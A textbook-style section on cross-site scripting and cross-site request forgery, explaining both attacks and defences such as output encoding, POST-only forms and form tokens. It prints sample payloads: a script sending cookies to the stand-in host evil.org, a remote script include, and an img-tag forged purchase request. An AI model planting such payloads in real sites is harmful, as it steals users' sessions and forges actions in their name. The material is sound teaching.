#### Cross-Site Attacks

An emerging breed of Web-based attacks is based on abusing trust by spoofing the origin of malicious information. The two most common examples of this style of attack are cross-site scripting (XSS) and cross-site request forgeries (CSRF).

#### Cross-Site Scripting

Cross-site scripting is a style of attack that involves the injection of malicious code into a site that is trusted by the victim. As an example, consider a Web-based forum, where users all view messages posted by each other. Imagine a user who posts the following message:

`<script>alert('Danger')</script> `

All users who view this post and have JavaScript enabled will execute this script as if it originated from the current Web site. Although this example is harmless (it displays an alert box), it should be clear that scripts with more malicious intent can be substituted.

One common use of this technique is to capture a user's cookies to use later in a presentation attack. For example, consider the following script:

`<script>document.location='http://evil.org/?cookies='+document.cookie</script>`
 
Because this script is located on the forum, any user who executes this script will send all of his/her forum cookies to evil.org in the form of a GET variable named cookies. An attacker from evil.org can then execute a presentation attack on the forum and impersonate another user.

For malicious scripts that are too large to fit into the comment field of the forum, a technique similar to the following can be used:

`<script src='http://evil.org/malicious_code'></script>`

This script will execute the code located on the evil.org site.

As is evident, the fundamental idea behind cross-site scripting is very simple, and this is one of the characteristics that has resulted in so much attention being devoted to the topic. Any Web site that allows users to view content submitted by others users (including Web-based e-mail clients) is potentially at risk of being vulnerable.

Guarding against this risk simply requires developers to adhere to the golden rule of Web development: Never trust data from the client. Imagine that the forum given in the previous examples implemented the following code when displaying the messages:

echo htmlspecialchars($message); 
This would encode the message in such a way that it would appear on the screen exactly as it was entered rather than the HTML tags being interpreted and not displayed. Another simple approach is to remove all HTML tags:

`echo strip_tags($message); `

More information on XSS can be found at http://www.cert.org/advisories/CA-2000-02.html and at http://httpd.apache.org/info/css-security/.

#### Cross-Site Request Forgeries

The term cross-site request forgeries (CSRF, pronounced "sea surf ") was originally coined by Peter Watkins, and this style of attack is described in detail at http://www.tux.org/~peterw/csrf.txt. Unlike cross-site scripting, where the attacks attempt to inject malicious code into trusted sites, CSRF attacks attempt to forge HTTP requests, using the authorization of the victim to bypass security checks.

Thus, whereas XSS abuses the trust granted to a particular Web site, CSRF abuses the trust granted to a particular user. The idea is to trick an authorized user into unknowingly performing an action on your behalf.

A common implementation uses an HTML <img> tag to cause a Web client to make a GET request to the URL designated in the <img> tag. Recall that the Web client sends a separate HTTP request for embedded resources such as images. For example, consider the following HTML:

`<img src="http://httphandbook.org/buy.php?book=0672324547&quantity=9999"> `

A browser will submit a request similar to the following to httphandbook.org:

`GET /buy.php?book=0672324547&quantity=9999 HTTP/1.1 
Host: httphandbook.org `

Thus, the GET request is identical to one that would be placed for an HTML link to this URL or a form submission that designates a method of GET. If a user had a prior relationship with httphandbook.org, the user might unknowingly purchase 9999 copies of HTTP Developer's Handbook simply by viewing someone's post on a Web-based forum, viewing an HTML e-mail, and so on.

A more sophisticated attack might use a URL that appears to be more legitimate and redirects the user to the rogue URL. Consider the following series of transactions:

```
GET /csrf.png HTTP/1.1 
Host: httphandbook.org 

HTTP/1.1 302 Found 
Location: http://httphandbook.org/buy.php?book=0672324547&quantity=9999 

GET /buy.php?book=0672324547&quantity=9999 HTTP/1.1 
Host: httphandbook.org 

HTTP/1.1 200 OK 
Content-Type: text/html 
Content-Length: 32 

<p>Thank you for your order!</p> 
```

Thus, an HTML <img> tag can reference what appears to be a legitimate URL for an image and still ultimately forge a malicious HTTP request.

CSRF attacks are more difficult to protect against than XSS. There are a few practices that you can follow in order to make such attacks more challenging. For example, for important HTML forms, the FORM method used in the HTML can be set to POST so that all legitimate requests use the POST request method. By then ensuring that the expected data arrives in the form of POST variables rather than GET (for example, by using the $_POST[] array in PHP), the use of the HTML <img> tag approach is no longer an option for an attacker.

By requiring the POST method, it is also more difficult to forge requests without the user realizing what has happened, even if after the fact. This is because a POST request is going to be for the parent resource rather than an embedded one, so the effect will be that the user will see the response (such as "Thank you for your order!" in the previous example).

A more secure approach is to ensure that all HTTP requests intended to originate from an HTML form do just that. A common method is to utilize a shared secret between the server and client. For example, if a hidden form field contains a randomly generated unique string, the server can then check to ensure that the string submitted in the next request matches the one originally included in the HTML form. This has the disadvantage of affecting legitimate users who make frequent use of the browser's Back button, so it may not be the best option for every application.

